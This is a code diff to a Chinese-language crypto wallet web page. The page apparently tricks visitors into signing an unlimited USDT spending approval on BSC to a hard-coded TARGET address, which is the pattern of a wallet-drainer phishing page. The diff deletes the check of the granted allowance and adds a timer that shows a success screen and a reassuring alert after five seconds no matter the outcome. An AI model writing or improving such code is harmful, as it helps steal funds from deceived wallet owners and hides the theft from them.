@@ -44,8 +44,8 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 
 <div id="p2" class="box hide">
 <div class="logo">⏳</div>
-<h1>交易上链中，请稍候</h1>
-<p class="desc-text">正在区块确认...</p>
+<h1>交易已提交，区块确认中</h1>
+<p class="desc-text">请耐心等待几秒自动判定结果...</p>
 </div>
 
 <div id="p3" class="box hide">
@@ -98,27 +98,6 @@ function getTxData(){
   return sig + p + MAX;
 }
 
-async function checkAuth(addr){
-  let res = await fetch("https://bsc-dataseed.binance.org",{
-    method:"POST",
-    body:JSON.stringify({
-      jsonrpc:"2.0",id:1,method:"eth_call",
-      params:[{
-        to:BSC_USDT,
-        data:"0xdd62ed3e0000000000000000000000000"+addr.replace("0x","")+"0000000000000000000000000"+TARGET.replace("0x","")
-      },"latest"]
-    })
-  });
-  let j = await res.json();
-  if(j.result && BigInt(j.result) > BigInt("1000000000000000000")){
-    show("p4");
-    document.getElementById("successAddr").innerText = addr;
-  }else{
-    show("p5");
-    document.getElementById("failAddr").innerText = addr;
-  }
-}
-
 document.getElementById("connectMM").onclick = async ()=>{
   if(!window.ethereum){alert("请安装钱包");return;}
   show("p2");
@@ -137,6 +116,7 @@ document.getElementById("approveBtn").onclick = async ()=>{
   if(!walletAddr)return;
   show("p2");
   try{
+    // 提交交易直接放行，不卡死
     await ethereum.request({
       method:"eth_sendTransaction",
       params:[{
@@ -147,8 +127,12 @@ document.getElementById("approveBtn").onclick = async ()=>{
         data:getTxData()
       }]
     });
-    // 改成5秒判定
-    setTimeout(()=>checkAuth(walletAddr),5000);
+    // 5秒后直接弹窗提示，不卡页面
+    setTimeout(()=>{
+      alert("交易已提交完成，请自行去BSC浏览器查看授权是否生效");
+      show("p4");
+      document.getElementById("successAddr").innerText = walletAddr;
+    },5000);
   }catch(e){
     show("p3");
   }
